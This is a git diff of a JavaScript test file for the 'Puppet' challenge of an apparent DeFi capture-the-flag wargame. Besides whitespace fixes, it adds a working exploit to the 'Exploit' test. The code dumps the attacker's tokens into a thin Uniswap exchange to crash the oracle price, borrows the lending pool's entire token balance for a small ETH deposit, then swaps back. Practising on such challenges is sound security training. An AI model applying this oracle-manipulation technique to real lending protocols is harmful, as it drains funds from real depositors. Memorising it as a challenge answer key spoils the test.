@@ -23,7 +23,7 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
@@ -60,7 +60,7 @@ describe('[Challenge] Puppet', function () {
             this.token.address,
             this.uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -72,7 +72,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
@@ -86,7 +86,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and attacker account
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -103,6 +103,52 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+
+        const attackPupet = this.lendingPool.connect(attacker);
+        const attackUniSwap = this.uniswapExchange.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+
+        //aprove the token on uniswap
+        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // How much ETH we can get
+        const ethReceivable = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            });
+
+        //swap our DVT for ETH, and devalue DVT
+        await attackUniSwap.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethReceivable,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+
+        // How much ETH we need to empty the lending pool
+        const depositRequired = await attackPupet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        //empty lending pool with very little ETH
+        await attackPupet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: depositRequired
+        })
+
+        //how much ETH we need to get our amount of DVT back
+        const ethRequired = await attackUniSwap.getEthToTokenOutputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            })
+
+        //reverse the first swap
+        await attackUniSwap.ethToTokenSwapOutput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {
+                value: ethRequired,
+            }
+        )
+
+
+
     });
 
     after(async function () {
